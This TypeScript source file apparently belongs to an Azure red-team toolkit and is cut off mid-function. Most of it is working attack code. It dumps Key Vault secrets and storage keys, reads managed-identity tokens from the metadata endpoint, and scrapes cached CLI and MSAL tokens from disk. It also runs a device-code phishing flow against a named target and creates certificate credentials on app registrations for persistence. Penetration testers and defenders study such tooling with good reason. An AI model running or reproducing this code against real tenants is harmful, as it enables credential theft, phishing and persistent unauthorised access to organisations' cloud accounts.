import { az, run, argVal, hasFlag, tryJson } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function keyvaultDump(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const vaultName = argVal(args, "--vault-name")

  if (vaultName) {
    const output = [`[*] Key Vault dump: ${vaultName}\n`]
    const secrets = await run("az", ["keyvault", "secret", "list", "--vault-name", vaultName, "-o", "json"], timeout)
    if (secrets.exitCode === 0) {
      const sl = tryJson(secrets.stdout) || []
      output.push(`[+] Secrets: ${sl.length}`)
      for (const s of sl) {
        const name = s.id?.split("/").pop() || s.name
        const val = await run(
          "az",
          ["keyvault", "secret", "show", "--vault-name", vaultName, "--name", name, "--query", "value", "-o", "tsv"],
          timeout,
        )
        if (val.exitCode === 0)
          output.push(`[+] ${name}: ${val.stdout.trim().slice(0, 80)}${val.stdout.length > 80 ? "..." : ""}`)
        else output.push(`[-] ${name}: access denied`)
      }
    }
    const keys = await run("az", ["keyvault", "key", "list", "--vault-name", vaultName, "-o", "json"], timeout)
    if (keys.exitCode === 0) output.push(`[+] Keys: ${(tryJson(keys.stdout) || []).length}`)
    const certs = await run("az", ["keyvault", "certificate", "list", "--vault-name", vaultName, "-o", "json"], timeout)
    if (certs.exitCode === 0) output.push(`[+] Certificates: ${(tryJson(certs.stdout) || []).length}`)
    return { output: output.join("\n"), findings: [] }
  }

  const vaults = await az(["keyvault", "list", "--query", "[].{name:name,rg:resourceGroup}"], sub, timeout)
  if (vaults.exitCode !== 0) return { output: `[-] Cannot list vaults: ${vaults.stderr.trim()}`, findings: [] }
  const vl = tryJson(vaults.stdout) || []
  const output = [`[*] Found ${vl.length} Key Vault(s)\n`]
  for (const v of vl) {
    const secrets = await run("az", ["keyvault", "secret", "list", "--vault-name", v.name, "-o", "json"], timeout)
    const count = secrets.exitCode === 0 ? (tryJson(secrets.stdout) || []).length : "denied"
    output.push(`[${count === "denied" ? "-" : "+"}] ${v.name}: ${count} secret(s)`)
  }
  return { output: output.join("\n"), findings: [] }
}

export async function managedIdentity(args: string[]): Promise<HookResult> {
  const resource = argVal(args, "--resource") || "https://management.azure.com/"
  const output: string[] = ["[*] Probing Azure IMDS for managed identity...\n"]

  try {
    const resp = await fetch(
      `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=${encodeURIComponent(resource)}`,
      {
        headers: { Metadata: "true" },
        signal: AbortSignal.timeout(5000),
      },
    )
    if (!resp.ok) {
      output.push(`[-] Token request failed: HTTP ${resp.status}`)
      return { output: output.join("\n"), findings: [] }
    }
    const token = await resp.json()
    output.push(`[+] Access token obtained for resource: ${resource}`)
    output.push(`    Token type: ${token.token_type}`)
    output.push(`    Expires: ${token.expires_on}`)
    output.push(`    Token: ${String(token.access_token).slice(0, 30)}...`)

    const instance = await fetch("http://169.254.169.254/metadata/instance?api-version=2021-02-01", {
      headers: { Metadata: "true" },
      signal: AbortSignal.timeout(5000),
    })
    if (instance.ok) {
      const meta = await instance.json()
      output.push(`\n[+] VM: ${meta.compute?.name}`)
      output.push(`    Location: ${meta.compute?.location}`)
      output.push(`    ResourceGroup: ${meta.compute?.resourceGroupName}`)
      output.push(`    Subscription: ${meta.compute?.subscriptionId}`)
    }
  } catch {
    output.push("[-] Cannot reach IMDS endpoint (not on Azure VM/App Service?)")
  }

  return { output: output.join("\n"), findings: [] }
}

export async function azureadToken(args: string[], timeout: number): Promise<HookResult> {
  const resource = argVal(args, "--resource") || "https://graph.microsoft.com"
  const scope = argVal(args, "--scope")
  const sub = argVal(args, "--subscription-id")
  const output: string[] = ["[*] Acquiring Azure AD access tokens...\n"]

  const tokenArgs = ["account", "get-access-token", "--resource", resource]
  if (scope) tokenArgs.push("--scope", scope)
  const tokenResult = await az(tokenArgs, sub, timeout)
  if (tokenResult.exitCode !== 0) {
    output.push(`[-] Token acquisition failed: ${tokenResult.stderr.slice(0, 300)}`)
    return { output: output.join("\n"), findings: [] }
  }
  const token = tryJson(tokenResult.stdout)
  if (!token) return { output: output.join("\n") + "\n[-] Failed to parse token response", findings: [] }
  output.push(`[+] Token acquired for resource: ${resource}`)
  output.push(`    Token type: ${token.tokenType}`)
  output.push(`    Expires: ${token.expiresOn}`)
  output.push(`    Tenant: ${token.tenant}`)
  output.push(`    Token: ${String(token.accessToken).slice(0, 30)}...`)

  const acctResult = await az(["account", "show"], sub, timeout)
  if (acctResult.exitCode === 0) {
    const acct = tryJson(acctResult.stdout)
    if (acct) {
      output.push(`\n[+] Current identity:`)
      output.push(`    User: ${acct.user?.name} (${acct.user?.type})`)
      output.push(`    Subscription: ${acct.name} (${acct.id})`)
      output.push(`    Tenant: ${acct.tenantId}`)
    }
  }

  const resources = [
    "https://management.azure.com",
    "https://vault.azure.net",
    "https://storage.azure.com",
    "https://database.windows.net",
  ]
  output.push("\n[*] Probing additional resource tokens...")
  for (const r of resources) {
    if (r === resource) continue
    const probe = await az(["account", "get-access-token", "--resource", r], sub, timeout)
    output.push(probe.exitCode === 0 ? `    [+] ${r} — token acquired` : `    [-] ${r} — denied`)
  }

  return { output: output.join("\n"), findings: [] }
}

export async function imdsHarvest(args: string[]): Promise<HookResult> {
  const resource = argVal(args, "--resource") || "https://management.azure.com/"
  const findings: Finding[] = []
  const output: string[] = ["[*] Harvesting Azure IMDS metadata...\n"]

  const meta = await run(
    "curl",
    [
      "-s",
      "--max-time",
      "5",
      "-H",
      "Metadata: true",
      "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    ],
    10,
  )
  if (meta.exitCode !== 0 || !meta.stdout.includes("vmId")) {
    return { output: output.join("\n") + "[-] Azure IMDS not accessible (not running in an Azure VM)", findings }
  }

  const d = tryJson(meta.stdout)
  if (d?.compute) {
    output.push(`[+] Azure IMDS accessible!`)
    output.push(`    VM: ${d.compute.name}`)
    output.push(`    RG: ${d.compute.resourceGroupName}`)
    output.push(`    Sub: ${d.compute.subscriptionId}`)
    output.push(`    Location: ${d.compute.location}`)
    output.push(`    VM Size: ${d.compute.vmSize}`)
    output.push(`    OS: ${d.compute.osType}`)
    if (d.compute.tags) output.push(`    Tags: ${d.compute.tags}`)
  }
  if (d?.network?.interface) {
    for (const iface of d.network.interface) {
      for (const ip of iface.ipv4?.ipAddress || []) {
        output.push(`    Private IP: ${ip.privateIpAddress}, Public IP: ${ip.publicIpAddress || "none"}`)
      }
    }
  }

  const token = await run(
    "curl",
    [
      "-s",
      "--max-time",
      "5",
      "-H",
      "Metadata: true",
      `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=${resource}`,
    ],
    10,
  )
  if (token.exitCode === 0) {
    const t = tryJson(token.stdout)
    if (t?.access_token) {
      output.push(`\n[+] Managed Identity token obtained!`)
      output.push(`    Resource: ${resource}`)
      output.push(`    Token: ${t.access_token.substring(0, 30)}...`)
      output.push(`    Expires: ${t.expires_on}`)
      findings.push({
        checkId: "AZ-IMDS-001",
        provider: "azure",
        severity: "critical",
        status: "EXTRACTED",
        resource: "imds://169.254.169.254",
        title: "Azure managed identity token extracted",
        details: `Resource: ${resource}, expires: ${t.expires_on}`,
        remediation: "Restrict managed identity permissions, use VM-level access controls",
      })
    }
  }

  const userData = await run(
    "curl",
    [
      "-s",
      "--max-time",
      "5",
      "-H",
      "Metadata: true",
      "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text",
    ],
    10,
  )
  if (userData.exitCode === 0 && userData.stdout.trim()) {
    const decoded = Buffer.from(userData.stdout.trim(), "base64").toString("utf-8")
    output.push(`\n[+] User Data (custom script):`)
    output.push(`    ${decoded.substring(0, 500)}`)
  }

  return { output: output.join("\n"), findings }
}

// ── New handlers ──

export async function deviceCodePhish(args: string[], timeout: number): Promise<HookResult> {
  const tenant = argVal(args, "--tenant") || "common"
  const clientId = argVal(args, "--client-id") || "04b07795-a71b-4346-935f-02f65e9a7b41"
  const scope = argVal(args, "--scope") || "https://graph.microsoft.com/.default offline_access"
  const pollTimeout = Number(argVal(args, "--poll-timeout") || "120")
  const findings: Finding[] = []
  const output: string[] = ["[*] Initiating Azure device code authentication flow...\n"]

  const initiate = await run(
    "curl",
    [
      "-s",
      "-X",
      "POST",
      `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`,
      "-d",
      `client_id=${clientId}&scope=${encodeURIComponent(scope)}`,
    ],
    30,
  )
  if (initiate.exitCode !== 0) {
    return { output: output.join("\n") + `[-] Device code request failed: ${initiate.stderr.trim()}`, findings }
  }

  const dc = tryJson(initiate.stdout)
  if (!dc?.device_code || !dc?.user_code) {
    return { output: output.join("\n") + `[-] Unexpected response: ${initiate.stdout.slice(0, 300)}`, findings }
  }

  output.push(`[+] Device code generated!`)
  output.push(`    User code: ${dc.user_code}`)
  output.push(`    Verification URL: ${dc.verification_uri}`)
  output.push(`    Message: ${dc.message}`)
  output.push(`    Expires in: ${dc.expires_in}s`)
  output.push(`\n[*] Send this to the target user:`)
  output.push(`    "Please sign in at ${dc.verification_uri} with code: ${dc.user_code}"`)
  output.push(`\n[*] Polling for authentication (${pollTimeout}s timeout)...`)

  findings.push({
    checkId: "AZ-TOKEN-001",
    provider: "azure",
    severity: "high",
    status: "INITIATED",
    resource: `oauth://device-code/${dc.user_code}`,
    title: "Device code phishing flow initiated",
    details: `Client: ${clientId}, Tenant: ${tenant}, Code: ${dc.user_code}`,
    remediation: "Block device code flow via Conditional Access policy",
  })

  const interval = (dc.interval || 5) * 1000
  const deadline = Date.now() + pollTimeout * 1000
  while (Date.now() < deadline) {
    await new Promise((r) => setTimeout(r, interval))
    const poll = await run(
      "curl",
      [
        "-s",
        "-X",
        "POST",
        `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
        "-d",
        `grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=${clientId}&device_code=${dc.device_code}`,
      ],
      15,
    )
    const result = tryJson(poll.stdout)
    if (!result) continue
    if (result.error === "authorization_pending") continue
    if (result.error === "slow_down") {
      await new Promise((r) => setTimeout(r, 5000))
      continue
    }
    if (result.error) {
      output.push(`[-] Auth error: ${result.error_description || result.error}`)
      return { output: output.join("\n"), findings }
    }
    if (result.access_token) {
      output.push(`\n[+] TOKEN ACQUIRED!`)
      output.push(`    Access token: ${result.access_token.substring(0, 40)}...`)
      if (result.refresh_token) output.push(`    Refresh token: ${result.refresh_token.substring(0, 40)}...`)
      output.push(`    Token type: ${result.token_type}`)
      output.push(`    Scope: ${result.scope}`)
      output.push(`    Expires in: ${result.expires_in}s`)

      const parts = result.access_token.split(".")
      if (parts.length === 3) {
        const payload = tryJson(Buffer.from(parts[1], "base64").toString("utf-8"))
        if (payload) {
          output.push(`\n[+] Token claims:`)
          output.push(`    UPN: ${payload.upn || payload.preferred_username || "N/A"}`)
          output.push(`    Name: ${payload.name || "N/A"}`)
          output.push(`    Tenant: ${payload.tid || "N/A"}`)
          output.push(`    App: ${payload.app_displayname || payload.azp || "N/A"}`)
        }
      }

      findings.push({
        checkId: "AZ-TOKEN-002",
        provider: "azure",
        severity: "critical",
        status: "EXTRACTED",
        resource: `oauth://token/${dc.user_code}`,
        title: "Device code phishing — token captured",
        details: `Scope: ${result.scope}, has refresh: ${!!result.refresh_token}`,
        remediation: "Revoke session, block device code flow in CA policy",
      })
      return { output: output.join("\n"), findings }
    }
  }

  output.push(`[-] Polling timed out after ${pollTimeout}s — target did not authenticate`)
  return { output: output.join("\n"), findings }
}

export async function tokenTheft(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] Searching for cached Azure tokens on disk...\n"]
  const home = process.env.HOME || process.env.USERPROFILE || ""

  const paths = [
    { path: `${home}/.azure/accessTokens.json`, label: "Azure CLI access tokens (legacy)" },
    { path: `${home}/.azure/azureProfile.json`, label: "Azure CLI profile" },
    { path: `${home}/.azure/msal_token_cache.json`, label: "MSAL token cache (JSON)" },
    { path: `${home}/.azure/msal_token_cache.bin`, label: "MSAL token cache (binary)" },
    { path: `${home}/.azure/service_principal_entries.json`, label: "Service principal entries" },
    { path: `${home}/.azure/clouds.config`, label: "Azure cloud config" },
    { path: `${home}/.config/azure-cli/accessTokens.json`, label: "Azure CLI tokens (XDG)" },
    { path: `${home}/.IdentityService/msal.cache`, label: "Visual Studio MSAL cache" },
    { path: `${home}/AppData/Local/.IdentityService/msal.cache`, label: "VS MSAL cache (Windows)" },
    {
      path: `${home}/.local/share/powershell/Modules/Az.Accounts/AzureRmContextSettings.json`,
      label: "PowerShell Az context",
    },
  ]

  let found = 0
  for (const p of paths) {
    try {
      const file = Bun.file(p.path)
      if (!(await file.exists())) continue
      const content = await file.text()
      if (!content.trim()) continue
      found++
      output.push(`[+] ${p.label}`)
      output.push(`    Path: ${p.path}`)
      output.push(`    Size: ${content.length} bytes`)

      if (p.path.endsWith(".json")) {
        const data = tryJson(content)
        if (Array.isArray(data)) {
          output.push(`    Entries: ${data.length}`)
          for (const entry of data.slice(0, 5)) {
            if (entry.accessToken) {
              output.push(
                `    Token: ${entry.accessToken.substring(0, 30)}... (${entry.resource || entry._authority || ""})`,
              )
              findings.push({
                checkId: "AZ-CRED-001",
                provider: "azure",
                severity: "critical",
                status: "EXTRACTED",
                resource: `file://${p.path}`,
                title: `Cached access token: ${entry.resource || entry._authority || "unknown"}`,
                details: `User: ${entry.userId || entry._clientId || "unknown"}, expires: ${entry.expiresOn || "unknown"}`,
                remediation: "Clear cached tokens: az account clear && az logout",
              })
            }
            if (entry.refreshToken) {
              output.push(`    Refresh: ${entry.refreshToken.substring(0, 20)}...`)
            }
          }
        }
        if (data && data.RefreshToken) {
          const tokens = Object.values(data.RefreshToken) as Record<string, string>[]
          output.push(`    Refresh tokens: ${tokens.length}`)
          for (const t of tokens.slice(0, 5)) {
            output.push(`    RT: ${String(t.secret || "").substring(0, 20)}... (${t.home_account_id || ""})`)
          }
          findings.push({
            checkId: "AZ-CRED-002",
            provider: "azure",
            severity: "critical",
            status: "EXTRACTED",
            resource: `file://${p.path}`,
            title: `MSAL refresh tokens found: ${tokens.length}`,
            details: "Refresh tokens can be exchanged for new access tokens without re-authentication",
            remediation: "Revoke refresh tokens via Azure AD, clear MSAL cache",
          })
        }
        if (data && data.AccessToken) {
          const tokens = Object.values(data.AccessToken) as Record<string, string>[]
          output.push(`    Access tokens: ${tokens.length}`)
          for (const t of tokens.slice(0, 3)) {
            output.push(`    AT: ${String(t.secret || "").substring(0, 30)}... (${t.realm || ""})`)
          }
        }
      } else {
        output.push(`    Preview: ${content.substring(0, 100)}...`)
      }
      output.push("")
    } catch {
      continue
    }
  }

  if (found === 0) {
    output.push("[-] No cached Azure tokens found on this system")
  } else {
    output.push(`\n[+] Total: ${found} credential file(s) found`)
  }

  return { output: output.join("\n"), findings }
}

export async function certificateAbuse(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const appId = argVal(args, "--app-id")
  const sub = argVal(args, "--subscription-id")
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure AD certificate credential analysis...\n"]

  if (action === "enum") {
    const apps = await run(
      "az",
      [
        "ad",
        "app",
        "list",
        "--query",
        "[].{id:id,appId:appId,name:displayName,certCreds:keyCredentials}",
        "-o",
        "json",
      ],
      timeout,
    )
    if (apps.exitCode !== 0) {
      return { output: output.join("\n") + `[-] Cannot list apps: ${apps.stderr.trim()}`, findings }
    }
    const appList = tryJson(apps.stdout) || []
    let certsFound = 0
    for (const app of appList) {
      const certs = app.certCreds || []
      if (certs.length === 0) continue
      certsFound += certs.length
      output.push(`[+] ${app.name} (${app.appId})`)
      for (const c of certs) {
        output.push(`    Key ID: ${c.keyId}`)
        output.push(`    Type: ${c.type}, Usage: ${c.usage}`)
        output.push(`    Start: ${c.startDateTime}, End: ${c.endDateTime}`)
        output.push(`    Description: ${c.displayName || "none"}`)
      }
      findings.push({
        checkId: "AZ-CERT-001",
        provider: "azure",
        severity: "high",
        status: "ENUMERATED",
        resource: `app://${app.appId}`,
        title: `App registration with ${certs.length} certificate credential(s): ${app.name}`,
        details: "Certificate auth bypasses MFA and most Conditional Access policies",
        remediation: "Audit certificate credentials, remove unused certificates, monitor certificate usage",
      })
    }
    output.push(`\n[*] Total: ${certsFound} certificate credential(s) across ${appList.length} app(s)`)

    const sps = await run(
      "az",
      [
        "ad",
        "sp",
        "list",
        "--all",
        "--query",
        "[?keyCredentials].{id:id,appId:appId,name:displayName,certs:keyCredentials}",
        "-o",
        "json",
      ],
      timeout,
    )
    if (sps.exitCode === 0) {
      const spList = tryJson(sps.stdout) || []
      if (spList.length > 0) {
        output.push(`\n[+] ${spList.length} service principal(s) with certificate credentials`)
        for (const sp of spList.slice(0, 10)) {
          output.push(`    ${sp.name}: ${(sp.certs || []).length} cert(s)`)
        }
      }
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "create") {
    if (!appId) return { output: "ERROR: --app-id required for create action", findings }
    const r = await run(
      "az",
      ["ad", "app", "credential", "reset", "--id", appId, "--create-cert", "--keyvault", "", "-o", "json"],
      timeout,
    )
    if (r.exitCode !== 0) {
      const fallback = await run(
        "az",
        ["ad", "app", "credential", "reset", "--id", appId, "--create-cert", "-o", "json"],
        timeout,
      )
      if (fallback.exitCode !== 0) {
        return { output: output.join("\n") + `[-] Certificate creation failed: ${fallback.stderr.trim()}`, findings }
      }
      const cred = tryJson(fallback.stdout)
      output.push(`[+] Self-signed certificate created for app ${appId}`)
      output.push(`    Certificate file: ${cred?.fileWithCertAndPrivateKey || "check current directory"}`)
      output.push(`    Tenant: ${cred?.tenant}`)
      output.push(`    Use: az login --service-principal -u ${appId} -p <cert.pem> --tenant ${cred?.tenant}`)
      findings.push({
        checkId: "AZ-CERT-002",
        provider: "azure",
        severity: "critical",
        status: "CREATED",
        resource: `app://${appId}`,
        title: "Certificate credential created for app registration",
        details: "Certificate auth persists even if passwords are rotated — bypasses MFA",
        remediation: `Remove: az ad app credential delete --id ${appId} --key-id <keyId>`,
      })
      return { output: output.join("\n"), findings }
    }
    const cred = tryJson(r.stdout)
    output.push(`[+] Certificate created and stored in Key Vault`)
    output.push(`    App: ${appId}, Tenant: ${cred?.tenant}`)
    return { output: output.join("\n"), findings }
  }

  return { output: `ERROR: Unknown action: ${action}. Use --action enum or --action create`, findings }
}

export async function storageKeyDump(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const targetAccount = argVal(args, "--account-name")
  const findings: Finding[] = []
  const output: string[] = ["[*] Extracting Azure Storage account access keys...\n"]

  const listArgs = [
    "storage",
    "account",
    "list",
    "--query",
    "[].{name:name,rg:resourceGroup,kind:kind,https:enableHttpsTrafficOnly,public:allowBlobPublicAccess}",
    "-o",
    "json",
  ]
  const accts = await az(listArgs, sub, timeout)
  if (accts.exitCode !== 0) {
    return { output: output.join("\n") + `[-] Cannot list storage accounts: ${accts.stderr.trim()}`, findings }
  }
  const accounts = (tryJson(accts.stdout) || []).filter(
    (a: Record<string, string>) => !targetAccount || a.name === targetAccount,
  )
  output.push(`[+] Found ${accounts.length} storage account(s)\n`)

  for (const acct of accounts) {
    output.push(`[*] ${acct.name} (${acct.rg}, ${acct.kind})`)
    if (acct.public === true) {
      output.push(`    [!] Public blob access ENABLED`)
      findings.push({
        checkId: "AZ-SKEY-001",
        provider: "azure",
        severity: "high",
        status: "FAIL",
        resource: `storage://${acct.name}`,
        title: `Public blob access enabled: ${acct.name}`,
        details: "Containers can be set to public access, exposing data",
        remediation: `az storage account update --name ${acct.name} --allow-blob-public-access false`,
      })
    }

    const keys = await run(
      "az",
      ["storage", "account", "keys", "list", "--account-name", acct.name, "--resource-group", acct.rg, "-o", "json"],
      timeout,
    )
    if (keys.exitCode === 0) {
      const kl = tryJson(keys.stdout) || []
      for (const k of kl) {
        output.push(`    Key ${k.keyName}: ${String(k.value).substring(0, 20)}...`)
        output.push(`    Created: ${k.creationTime || "unknown"}`)
        output.push(`    Permissions: ${k.permissions}`)
      }
      findings.push({
        checkId: "AZ-SKEY-002",
        provider: "azure",
        severity: "critical",
        status: "EXTRACTED",
        resource: `storage://${acct.name}`,
        title: `Storage account keys extracted: ${acct.name}`,
        details: `${kl.length} key(s) — keys never expire and grant full account access`,
        remediation: "Rotate keys, use Managed Identity or SAS tokens instead of account keys",
      })
    } else {
      output.push(`    [-] Key access denied`)
    }

    const connStr = await run(
      "az",
      ["storage", "account", "show-connection-string", "--name", acct.name, "--resource-group", acct.rg, "-o", "tsv"],
      timeout,
    )
    if (connStr.exitCode === 0 && connStr.stdout.trim()) {
      output.push(`    Connection string: ${connStr.stdout.trim().substring(0, 60)}...`)
    }
    output.push("")
  }

  return { output: output.join("\n"), findings }
}

export async function automationCredDump(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const targetAccount = argVal(args, "--automation-account")
  const findings: Finding[] = []
  const output: string[] = ["[*] Extracting credentials from Azure Automation Accounts...\n"]

  const accts = await az(
    ["automation", "account", "list", "--query", "[].{name:name,rg:resourceGroup,state:state,identity:identity.type}"],
    sub,
    timeout,
  )
  if (accts.exitCode !== 0) {
    return { output: output.join("\n") + `[-] Cannot list automation accounts: ${accts.stderr.trim()}`, findings }
  }
  const accounts = (tryJson(accts.stdout) || []).filter(
    (a: Record<string, string>) => !targetAccount || a.name === targetAccount,
  )
  output.push(`[+] Found ${accounts.length} Automation Account(s)\n`)

  for (const acct of accounts) {
    output.push(`[*] ${acct.name} (${acct.rg}) — state: ${acct.state}, identity: ${acct.identity || "none"}`)

    const creds = await az(
      ["automation", "credential", "list", "--automation-account-name", acct.name, "--resource-group", acct.rg],
      sub,
      timeout,
    )
    if (creds.exitCode === 0) {
      const credList = tryJson(creds.stdout) || []
      if (credList.length > 0) {
        output.push(`    [+] Credentials: ${credList.length}`)
        for (const c of credList) {
          output.push(`        ${c.name} — user: ${c.userName || "N/A"}, description: ${c.description || "none"}`)
          findings.push({
            checkId: "AZ-AUTO-001",
            provider: "azure",
            severity: "high",
            status: "ENUMERATED",
            resource: `automation://${acct.name}/credential/${c.name}`,
            title: `Automation credential: ${c.name} (user: ${c.userName || "N/A"})`,
            details:
              "Credentials stored in Automation Accounts can be used in runbooks — passwords not retrievable via API but usernames leak info",
            remediation: "Use Managed Identity instead of stored credentials",
          })
        }
      }
    }

    const vars = await az(
      ["automation", "variable", "list", "--automation-account-name", acct.name, "--resource-group", acct.rg],
      sub,
      timeout,
    )
    if (vars.exitCode === 0) {
      const varList = tryJson(vars.stdout) || []
      if (varList.length > 0) {
        output.push(`    [+] Variables: ${varList.length}`)
        for (const v of varList) {
          const encrypted = v.isEncrypted ? "encrypted" : "PLAINTEXT"
          output.push(
            `        ${v.name} [${encrypted}]: ${v.isEncrypted ? "(encrypted)" : String(v.value || "").substring(0, 60)}`,
          )
          if (!v.isEncrypted && v.value) {
            findings.push({
              checkId: "AZ-AUTO-002",
              provider: "azure",
              severity: "high",
              status: "EXTRACTED",
              resource: `automation://${acct.name}/variable/${v.name}`,
              title: `Plaintext automation variable: ${v.name}`,
              details: `Value: ${String(v.value).substring(0, 80)}`,
              remediation: "Encrypt sensitive variables in Automation Account settings",
            })
          }
        }
      }
    }

    const certs = await az(
      ["automation", "certificate", "list", "--automation-account-name", acct.name, "--resource-group", acct.rg],
      sub,
      timeout,
    )
    if (certs.exitCode === 0) {
      const certList = tryJson(certs.stdout) || []
      if (certList.length > 0) {
        output.push(`    [+] Certificates: ${certList.length}`)
        for (const c of certList) {
          output.push(`        ${c.name} — exportable: ${c.isExportable}, expires: ${c.expiryTime || "unknown"}`)
          if (c.isExportable) {
            findings.push({
              checkId: "AZ-AUTO-003",
              provider: "azure",
              severity: "high",
              status: "ENUMERATED",
              resource: `automation://${acct.name}/certificate/${c.name}`,
              title: `Exportable automation certificate: ${c.name}`,
              details: "Exportable certificates can be downloaded and used for authentication",
              remediation: "Set certificates as non-exportable",
            })
          }
        }
      }
    }

    const runAs = await az(
      [
        "automation",
        "account",
        "show",
        "--name",
        acct.name,
        "--resource-group",
        acct.rg,
        "--query",
        "{identity:identity,automationHybridServiceUrl:automationHybridServiceUrl}",
      ],
      sub,
      timeout,
    )
    if (runAs.exitCode === 0) {
      const info = tryJson(runAs.stdout)
      if (info?.identity) {
        output.push(`    [+] Identity: type=${info.identity.type}, principalId=${info.identity.principalId || "N/A"}`)
      }
    }

    const runbooks = await az(
      [
        "automation",
        "runbook",
        "list",
        "--automation-account-name",
        acct.name,
        "--resource-group",
        acct.rg,
        "--query",
        "[].{name:name,type:runbookType,state:state}",
      ],
      sub,
      timeout,
    )
    if (runbooks.exitCode === 0) {
      const rbList = tryJson(runbooks.stdout) || []
      output.push(`    [+] Runbooks: ${rbList.length}`)
      for (const rb of rbList.slice(0, 10)) {
        output.push(`        ${rb.name} (${rb.type}, ${rb.state})`)
      }
    }
    output.push("")
  }

  return { output: output.join("\n"), findings }
}

export async function graphTokenHarvest(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] Harvesting Microsoft Graph and Azure resource tokens...\n"]

  const resources = [
    { name: "Microsoft Graph", url: "https://graph.microsoft.com" },
    { name: "Azure Management", url: "https://management.azure.com" },
    { name: "Azure Key Vault", url: "https://vault.azure.net" },
    { name: "Azure SQL Database", url: "https://database.windows.net" },
    { name: "Azure Storage", url: "https://storage.azure.com" },
    { name: "Azure Data Lake", url: "https://datalake.azure.net" },
    { name: "Azure Service Bus", url: "https://servicebus.azure.net" },
    { name: "Azure Event Hubs", url: "https://eventhubs.azure.net" },
    { name: "Azure Log Analytics", url: "https://api.loganalytics.io" },
    { name: "Azure DevOps", url: "499b84ac-1321-427f-aa17-267ca6975798" },
  ]

  for (const r of resources) {
    const tok = await run("az", ["account", "get-access-token", "--resource", r.url, "-o", "json"], timeout)
    if (tok.exitCode === 0) {
      const data = tryJson(tok.stdout)
      if (data?.accessToken) {
        const parts = data.accessToken.split(".")
        let claims: Record<string, string> = {}
        try {
          claims = JSON.parse(Buffer.from(parts[1], "base64").toString())
        } catch {}
        const exp = claims.exp ? new Date(Number(claims.exp) * 1000).toISOString() : "unknown"
        const aud = claims.aud || r.url
        const appid = claims.appid || "N/A"
        output.push(`[+] ${r.name}: TOKEN ACQUIRED`)
        output.push(`    Audience: ${aud}`)
        output.push(`    AppId: ${appid}`)
        output.push(`    Expires: ${exp}`)
        output.push(`    Token (first 40): ${data.accessToken.substring(0, 40)}...`)
        output.push("")
        findings.push({
          checkId: "AZ-GRAPH-001",
          provider: "azure",
          severity: "high",
          status: "HARVESTED",
          resource: `token://${r.name}`,
          title: `Token acquired for ${r.name}`,
          details: `Audience: ${aud}, AppId: ${appid}, Expires: ${exp}`,
          remediation: "Revoke sessions and rotate credentials",
        })
      }
    } else {
      output.push(`[-] ${r.name}: access denied or no token available`)
    }
  }

  return { output: output.join("\n"), findings }
}

export async function refreshTokenReplay(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] Extracting and analyzing refresh/access tokens...\n"]

  const tok = await run("az", ["account", "get-access-token", "-o", "json"], timeout)
  if (tok.exitCode === 0) {
    const data = tryJson(tok.stdout)
    if (data?.accessToken) {
      const parts = data.accessToken.split(".")
      if (parts.length === 3) {
        let header: Record<string, string> = {}
        let payload: Record<string, string> = {}
        try {
          header = JSON.parse(Buffer.from(parts[0], "base64").toString())
          payload = JSON.parse(Buffer.from(parts[1], "base64").toString())
        } catch {}
        output.push("[+] Access Token JWT Decoded:")
        output.push(`    Algorithm: ${header.alg || "N/A"}`)
        output.push(`    Type: ${header.typ || "N/A"}`)
        output.push(`    Issuer: ${payload.iss || "N/A"}`)
        output.push(`    Audience: ${payload.aud || "N/A"}`)
        output.push(`    Subject: ${payload.sub || "N/A"}`)
        output.push(`    UPN: ${payload.upn || "N/A"}`)
        output.push(`    AppId: ${payload.appid || payload.azp || "N/A"}`)
        output.push(`    Tenant: ${payload.tid || "N/A"}`)
        output.push(`    Scopes: ${payload.scp || "N/A"}`)
        output.push(`    Roles: ${Array.isArray(payload.roles) ? payload.roles.join(", ") : payload.roles || "N/A"}`)
        output.push(`    Issued: ${payload.iat ? new Date(Number(payload.iat) * 1000).toISOString() : "N/A"}`)
        output.push(`    Expires: ${payload.exp ? new Date(Number(payload.exp) * 1000).toISOString() : "N/A"}`)
        const amr = payload.amr
        if (amr) output.push(`    Auth methods: ${Array.isArray(amr) ? amr.join(", ") : amr}`)
        const deviceid = payload.deviceid
        if (deviceid) output.push(`    Device ID: ${deviceid} (PRT-linked)`)
        output.push("")
        findings.push({
          checkId: "AZ-PRT-001",
          provider: "azure",
          severity: "high",
          status: "EXTRACTED",
          resource: `token://access/${payload.upn || payload.sub || "unknown"}`,
          title: `Access token decoded for ${payload.upn || payload.sub || "unknown"}`,
          details: `Tenant: ${payload.tid}, AppId: ${payload.appid || payload.azp}, Scopes: ${payload.scp || "N/A"}`,
          remediation: "Revoke all refresh tokens: az rest --method POST --url 'https://graph.microsoft.com/v1.0/me/revokeSignInSessions'",
        })
      }
    }
  } else {
    output.push("[-] Could not acquire access token via az CLI")
  }

  if (process.platform === "win32") {
    output.push("\n[*] Checking dsregcmd for PRT info...")
    const dsreg = await run("dsregcmd", ["/status"], timeout)
    if (dsreg.exitCode === 0) {
      const lines = dsreg.stdout.split("\n")
      const prtLine = lines.find((l: string) => l.includes("AzureAdPrt"))
      if (prtLine && prtLine.includes("YES")) {
        output.push("[+] PRT is present on this device!")
        const tenantLine = lines.find((l: string) => l.includes("TenantId"))
        if (tenantLine) output.push(`    ${tenantLine.trim()}`)
        findings.push({
          checkId: "AZ-PRT-002",
          provider: "azure",
          severity: "critical",
          status: "DETECTED",
          resource: "device://prt",
